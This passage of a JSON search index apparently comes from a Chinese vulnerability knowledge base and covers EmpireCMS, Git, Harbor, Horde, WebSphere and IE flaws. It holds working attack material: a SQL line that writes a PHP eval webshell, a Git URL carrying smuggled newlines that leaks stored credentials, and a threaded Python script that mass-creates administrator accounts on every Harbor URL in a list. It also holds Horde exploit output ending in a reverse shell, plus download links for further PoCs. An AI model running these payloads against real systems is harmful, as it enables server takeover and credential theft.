\u7531\u4e8e\u540e\u7aef\u6ca1\u6709\u5bf9\u6267\u884c\u7684\u8bed\u53e5\u505a\u9650\u5236\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u6076\u610fsql\u8bed\u53e5\u3002 POC\uff1a select '<?php @eval($_POST[1])?>' into outfile 'D:/phpstudy_pro/WWW/shell.php' \u6839\u636e\u5b9e\u9645\u8def\u5f84\u4fee\u6539\u8def\u5f84\u5373\u53ef\u3002","title":"EmpireCMS"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS/#_1","text":"EmpireCMS <= V7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS/#_2","text":"\u7531\u4e8e\u540e\u7aef\u6ca1\u6709\u5bf9\u6267\u884c\u7684\u8bed\u53e5\u505a\u9650\u5236\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u6076\u610fsql\u8bed\u53e5\u3002 POC\uff1a select '<?php @eval($_POST[1])?>' into outfile 'D:/phpstudy_pro/WWW/shell.php' \u6839\u636e\u5b9e\u9645\u8def\u5f84\u4fee\u6539\u8def\u5f84\u5373\u53ef\u3002","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u6d4b\u8bd5\u73af\u5883 \u00b6 Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26 \u6f0f\u6d1e\u73af\u5883\u642d\u5efa \u00b6 1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09 \u00b6 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.phome.net/download/ 2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55 \u00b6 3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c \u00b6 \u5730\u5740\uff1a http://127.0.0.1/e/install/index.php 4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef \u00b6","title":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26","title":"\u6d4b\u8bd5\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#1empirecms","text":"\u4e0b\u8f7d\u5730\u5740\uff1a http://www.phome.net/download/","title":"1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#2-upload","text":"","title":"2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#3","text":"\u5730\u5740\uff1a http://127.0.0.1/e/install/index.php","title":"3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#4","text":"","title":"4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef"},{"location":"Web%E5%AE%89%E5%85%A8/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/","text":"\u63cf\u8ff0 \u00b6 Git\u4f7f\u7528\u51ed\u8bc1\u52a9\u624b(credential helper)\u6765\u5e2e\u52a9\u7528\u6237\u5b58\u50a8\u548c\u68c0\u7d22\u51ed\u8bc1\u3002\u4f46\u662f\u5f53\u4e00\u4e2aURL\u4e2d\u5305\u542b\u7ecf\u8fc7\u7f16\u7801\u7684\u6362\u884c\u7b26\u65f6\uff0c\u53ef\u80fd\u5c06\u975e\u9884\u671f\u7684\u503c\u6ce8\u5165\u5230credential helper\u7684\u534f\u8bae\u6d41\u4e2d\u3002\u8fd9\u5c06\u4f7f\u6076\u610fURL\u6b3a\u9a97Git\u5ba2\u6237\u7aef\u53bb\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e3b\u673a\u51ed\u636e\u3002\u5f53\u4f7f\u7528\u53d7\u5f71\u54cd\u7248\u672c Git\u5bf9\u6076\u610f URL \u6267\u884c git clone \u547d\u4ee4\u65f6\u4f1a\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Git2.17.x <= 2.17.3Git2.18.x <= 2.18.2Git2.19.x <= 2.19.3Git2.20.x <= 2.20.2Git2.21.x <= 2.21.1Git2.22.x <= 2.22.2Git2.23.x <= 2.23.1Git2.24.x <= 2.24.1Git2.25.x <= 2.25.2Git2.26.x <= 2.26.0 poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1upYlyZFZMDuNZ5YnMnrmaQ \u63d0\u53d6\u7801\uff1ae9iz \u542f\u52a8poc\uff1ago run poc.go git\u5728\u6267\u884c\u7c7b\u4f3c\"git clone https://example.com\" \u8fd9\u6837\u7684\u547d\u4ee4\u65f6,\u4f1a\u8bf7\u6c42\u4f7f\u7528\u534f\u8bae\"https\"\u5b58\u50a8\u4e3b\u673a\"example.com\"\u7684\u51ed\u636e\uff0c\u5e76\u5728\u8fdc\u7a0b\u7aef\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u65f6\u5c06\u8fd4\u56de\u7684\u51ed\u636e\u9644\u52a0\u5230\u53d1\u51fa\u7684\u8bf7\u6c42\u4e2d git clone 'http://localhost:8088/%0ahost=github.com%0aprotocol=https' \u83b7\u53d6\u5230git\u7684\u51ed\u8bc1 \u4fee\u590d\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Git\u51ed\u8bc1\u6cc4\u9732\u6f0f\u6d1e\uff08CVE-2020-5260\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_1","text":"Git\u4f7f\u7528\u51ed\u8bc1\u52a9\u624b(credential helper)\u6765\u5e2e\u52a9\u7528\u6237\u5b58\u50a8\u548c\u68c0\u7d22\u51ed\u8bc1\u3002\u4f46\u662f\u5f53\u4e00\u4e2aURL\u4e2d\u5305\u542b\u7ecf\u8fc7\u7f16\u7801\u7684\u6362\u884c\u7b26\u65f6\uff0c\u53ef\u80fd\u5c06\u975e\u9884\u671f\u7684\u503c\u6ce8\u5165\u5230credential helper\u7684\u534f\u8bae\u6d41\u4e2d\u3002\u8fd9\u5c06\u4f7f\u6076\u610fURL\u6b3a\u9a97Git\u5ba2\u6237\u7aef\u53bb\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e3b\u673a\u51ed\u636e\u3002\u5f53\u4f7f\u7528\u53d7\u5f71\u54cd\u7248\u672c Git\u5bf9\u6076\u610f URL \u6267\u884c git clone \u547d\u4ee4\u65f6\u4f1a\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002","title":"\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_2","text":"Git2.17.x <= 2.17.3Git2.18.x <= 2.18.2Git2.19.x <= 2.19.3Git2.20.x <= 2.20.2Git2.21.x <= 2.21.1Git2.22.x <= 2.22.2Git2.23.x <= 2.23.1Git2.24.x <= 2.24.1Git2.25.x <= 2.25.2Git2.26.x <= 2.26.0 poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1upYlyZFZMDuNZ5YnMnrmaQ \u63d0\u53d6\u7801\uff1ae9iz \u542f\u52a8poc\uff1ago run poc.go git\u5728\u6267\u884c\u7c7b\u4f3c\"git clone https://example.com\" \u8fd9\u6837\u7684\u547d\u4ee4\u65f6,\u4f1a\u8bf7\u6c42\u4f7f\u7528\u534f\u8bae\"https\"\u5b58\u50a8\u4e3b\u673a\"example.com\"\u7684\u51ed\u636e\uff0c\u5e76\u5728\u8fdc\u7a0b\u7aef\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u65f6\u5c06\u8fd4\u56de\u7684\u51ed\u636e\u9644\u52a0\u5230\u53d1\u51fa\u7684\u8bf7\u6c42\u4e2d git clone 'http://localhost:8088/%0ahost=github.com%0aprotocol=https' \u83b7\u53d6\u5230git\u7684\u51ed\u8bc1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_3","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 GreenCMS v2.3.0603\u53ca\u4ee5\u4e0b\u7248\u672c \u6f0f\u6d1ePOC \u00b6 POC","title":"GreenCMS \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","text":"GreenCMS v2.3.0603\u53ca\u4ee5\u4e0b\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u7248\u672c \u00b6 Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c \u4e0d\u53d7\u5f71\u54cd\u7248\u672c \u00b6 Harbor>= 1.7.6 Harbor>= 1.8.3 \u590d\u73b0\u4e4b\u73af\u5883\u51c6\u5907 \u00b6 1.Cenos7\u5b89\u88c5\u597ddocker\u548cdocker-compose 2.\u4e0b\u8f7d\u5e76\u5b89\u88c5harbor1.8.1\u5728\u7ebf\u5b89\u88c5\u7248\u672c wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xvf harbor-online-installer-v1.8.0.tgz cd harbor vi harbor.yml \u4fee\u6539hostname\u4e3a\u5b89\u88c5Harbor\u673a\u5668\u7684IP\u5730\u5740\u3002 \u5b89\u88c5harbor ./install.sh \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6ce8\u518c\u4e00\u4e2aHarbor\u5e10\u53f7\uff0c\u586b\u5199\u5bc6\u7801\u65f6\u6ce8\u610f\u8981\u7b26\u5408\u89c4\u8303 \u5bf9\u6ce8\u518c\u4fe1\u606f\u8fdb\u884c\u6293\u5305\u4fee\u6539\uff0c\u5728post\u6570\u636e\u540e\u9762\u6dfb\u52a0\u201dhas_admin_role\u201d:true \u67e5\u770b[Response]\uff0c\u8fd4\u56de201,\u8bf4\u660e\u5199\u5165\u6210\u529f\u3002 \u4f7f\u7528admin\u5e10\u53f7\u8fdb\u5165\u540e\u53d1\u73b0\uff0c\u5df2\u7ecf\u6210\u529f\u5199\u5165\u5e10\u53f7\uff0c\u5e76\u4e14\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002 \u6279\u91cf\u5229\u7528poc \u00b6 import requests import threading import logging data='{\"username\":\"biubiubiu\",\"email\":\"biubiubiu11@qq.com\",\"realname\":\"biubiu1biu\",\"password\":\"Aa111111\",\"comment\":\"biubiubiu\",\"has_admin_role\":true}' headers={\"Content-Type\": \"application/json\"} def poc(url): pwn_url=url+\"/api/users\" payload=data try: r=requests.post(pwn_url, data=payload,headers=headers,timeout=10) print(pwn_url) print(r.status_code) if r.status_code == 201: print(\"\\n\\n you has created a user,username=biubiubiu,password=Aa111111\") f.write(url+\" The URL has created a user,username=biubiubiu,password=Aa111111\") else: print(\"The vulnerability does not exist on the website or the account name has been written\") except Exception as e: logging.warning(pwn_url) print(e) if __name__ == '__main__': print (\"this is a CVE-2019-16097 poc\") print(\"more cve-2019-16097 info welcome to https://www.lstazl.com\") f=open(\"results.txt\",\"a\") url_list=[i.replace(\"\\n\",\"\") for i in open(\"urls.txt\",\"r\").readlines()] for url in url_list: threading.Thread(target=poc,args=(url,)).start() while 1: if (len(threading.enumerate())<50): break 1.\u5728urls.txt\u4e2d\u6dfb\u52a0\u4f60\u8981\u68c0\u6d4b\u7684url 2.python3\u73af\u5883\u4e0b\u8fd0\u884ccve-2019-16097\u811a\u672c python3 cve-2019-16097.py 3.\u6279\u91cf\u68c0\u6d4b\u5b8c\u6210\u540e\u518dresults\u4e2d\u67e5\u770b\u6210\u529f\u5199\u5165\u8d26\u53f7\u7684url\u3002","title":"Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_1","text":"Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Harbor>= 1.7.6 Harbor>= 1.8.3","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_3","text":"1.Cenos7\u5b89\u88c5\u597ddocker\u548cdocker-compose 2.\u4e0b\u8f7d\u5e76\u5b89\u88c5harbor1.8.1\u5728\u7ebf\u5b89\u88c5\u7248\u672c wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xvf harbor-online-installer-v1.8.0.tgz cd harbor vi harbor.yml \u4fee\u6539hostname\u4e3a\u5b89\u88c5Harbor\u673a\u5668\u7684IP\u5730\u5740\u3002 \u5b89\u88c5harbor ./install.sh","title":"\u590d\u73b0\u4e4b\u73af\u5883\u51c6\u5907"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u6ce8\u518c\u4e00\u4e2aHarbor\u5e10\u53f7\uff0c\u586b\u5199\u5bc6\u7801\u65f6\u6ce8\u610f\u8981\u7b26\u5408\u89c4\u8303 \u5bf9\u6ce8\u518c\u4fe1\u606f\u8fdb\u884c\u6293\u5305\u4fee\u6539\uff0c\u5728post\u6570\u636e\u540e\u9762\u6dfb\u52a0\u201dhas_admin_role\u201d:true \u67e5\u770b[Response]\uff0c\u8fd4\u56de201,\u8bf4\u660e\u5199\u5165\u6210\u529f\u3002 \u4f7f\u7528admin\u5e10\u53f7\u8fdb\u5165\u540e\u53d1\u73b0\uff0c\u5df2\u7ecf\u6210\u529f\u5199\u5165\u5e10\u53f7\uff0c\u5e76\u4e14\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#poc","text":"import requests import threading import logging data='{\"username\":\"biubiubiu\",\"email\":\"biubiubiu11@qq.com\",\"realname\":\"biubiu1biu\",\"password\":\"Aa111111\",\"comment\":\"biubiubiu\",\"has_admin_role\":true}' headers={\"Content-Type\": \"application/json\"} def poc(url): pwn_url=url+\"/api/users\" payload=data try: r=requests.post(pwn_url, data=payload,headers=headers,timeout=10) print(pwn_url) print(r.status_code) if r.status_code == 201: print(\"\\n\\n you has created a user,username=biubiubiu,password=Aa111111\") f.write(url+\" The URL has created a user,username=biubiubiu,password=Aa111111\") else: print(\"The vulnerability does not exist on the website or the account name has been written\") except Exception as e: logging.warning(pwn_url) print(e) if __name__ == '__main__': print (\"this is a CVE-2019-16097 poc\") print(\"more cve-2019-16097 info welcome to https://www.lstazl.com\") f=open(\"results.txt\",\"a\") url_list=[i.replace(\"\\n\",\"\") for i in open(\"urls.txt\",\"r\").readlines()] for url in url_list: threading.Thread(target=poc,args=(url,)).start() while 1: if (len(threading.enumerate())<50): break 1.\u5728urls.txt\u4e2d\u6dfb\u52a0\u4f60\u8981\u68c0\u6d4b\u7684url 2.python3\u73af\u5883\u4e0b\u8fd0\u884ccve-2019-16097\u811a\u672c python3 cve-2019-16097.py 3.\u6279\u91cf\u68c0\u6d4b\u5b8c\u6210\u540e\u518dresults\u4e2d\u67e5\u770b\u6210\u529f\u5199\u5165\u8d26\u53f7\u7684url\u3002","title":"\u6279\u91cf\u5229\u7528poc"},{"location":"Web%E5%AE%89%E5%85%A8/Horde%20Groupware/Horde%20Groupware%20Webmail%20Edition%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145 (+) targeting http://172.16.175.145/horde/ (+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object (+) triggering deserialization... (+) starting handler on port 1337 (+) connection from 172.16.175.145 (+) pop thy shell! id uid=33(www-data) gid=33(www-data) groups=33(www-data) pwd /var/www/horde/services poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1-P-9IUMpHKZDIXELIFIOJg \u63d0\u53d6\u7801\uff1adgne","title":"Horde Groupware Webmail Edition \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"Web%E5%AE%89%E5%85%A8/IBM%20WebSphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/","text":"\u6f0f\u6d1e\u5206\u6790\uff1a \u00b6 IBM WebSphere \u5e94\u2f64\u7a0b\u5e8f\u670d\u52a1\u56687.0\u30018.0\u30018.5 \u548c9.0 \u5728\u5904\u7406XML \u6570\u636e\u65f6\u5bb9\u6613\u53d7\u5230XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a \uff08XXE\uff09 \u653b\u51fb\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u2f64\u6b64\u6f0f\u6d1e\u516c\u5f00\u654f\u611f\u4fe1\u606f\u3002IBM Xforce ID\uff1a185590\u3002 \u5f71\u54cd\u8303\u56f4\uff1a \u00b6 WebSphere Application Server 7.0\u7248\u672c WebSphere Application Server 8.0\u7248\u672c WebSphere Application Server 8.5\u7248\u672c WebSphere Application Server 9.0\u7248\u672c \u4fee\u590d\u5efa\u8bae\uff1a \u00b6 \u5b98\u2f45\u5df2\u7ecf\u63d0\u4f9b\u7684\u8865\u4e01\u7248\u672c\u5217\u8868\uff1a WebSphere 9.0.0.0 - 9.0.5.5\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52309.0.5.6\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.5.0.0 - 8.5.5.17\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52308.5.5.19\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.0.0.0 - 8.0.0.15\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52308.0.0.15\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01 WebSphere 7.0.0.0 - 7.0.0.45 \u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52307.0.0.45\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01","title":"IBM WebSphere\u5b58\u5728XXE\u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a\u6f0f\u6d1e CVE-2020-4643"},{"location":"Web%E5%AE%89%E5%85%A8/IBM%20WebSphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_1","text":"IBM WebSphere \u5e94\u2f64\u7a0b\u5e8f\u670d\u52a1\u56687.0\u30018.0\u30018.5 \u548c9.0 \u5728\u5904\u7406XML \u6570\u636e\u65f6\u5bb9\u6613\u53d7\u5230XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a \uff08XXE\uff09 \u653b\u51fb\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u2f64\u6b64\u6f0f\u6d1e\u516c\u5f00\u654f\u611f\u4fe1\u606f\u3002IBM Xforce ID\uff1a185590\u3002","title":"\u6f0f\u6d1e\u5206\u6790\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/IBM%20WebSphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_2","text":"WebSphere Application Server 7.0\u7248\u672c WebSphere Application Server 8.0\u7248\u672c WebSphere Application Server 8.5\u7248\u672c WebSphere Application Server 9.0\u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/IBM%20WebSphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_3","text":"\u5b98\u2f45\u5df2\u7ecf\u63d0\u4f9b\u7684\u8865\u4e01\u7248\u672c\u5217\u8868\uff1a WebSphere 9.0.0.0 - 9.0.5.5\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52309.0.5.6\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.5.0.0 - 8.5.5.17\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52308.5.5.19\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.0.0.0 - 8.0.0.15\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52308.0.0.15\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01 WebSphere 7.0.0.0 - 7.0.0.45 \u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52307.0.0.45\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01","title":"\u4fee\u590d\u5efa\u8bae\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-1092 \u6f0f\u6d1e\u7ea7\u522b\uff1a\u9ad8\u5371 \u6f0f\u6d1e\u63cf\u8ff0\uff1a \u00b6 IE9\u548cIE11\u7248\u672c\u4e2d\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u672a\u80fd\u6b63\u786e\u8bbf\u95ee\u5185\u5b58\u5bf9\u8c61\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u7834\u574f\u5185\u5b58\u3002 \u5f71\u54cd\u8303\u56f4\uff1a \u00b6 IE9\u548cIE11 \u7f13\u89e3\u63aa\u65bd\uff1a \u00b6 \u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\uff0c\u8865\u4e01\u83b7\u53d6\u5730\u5740\uff1a https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisor/CVE-2020-1092","title":"IE\u6d4f\u89c8\u5668\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"IE9\u548cIE11\u7248\u672c\u4e2d\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u672a\u80fd\u6b63\u786e\u8bbf\u95ee\u5185\u5b58\u5bf9\u8c61\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u7834\u574f\u5185\u5b58\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"IE9\u548cIE11","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\uff0c\u8865\u4e01\u83b7\u53d6\u5730\u5740\uff1a https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisor/CVE-2020-1092","title":"\u7f13\u89e3\u63aa\u65bd\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 FasterXML 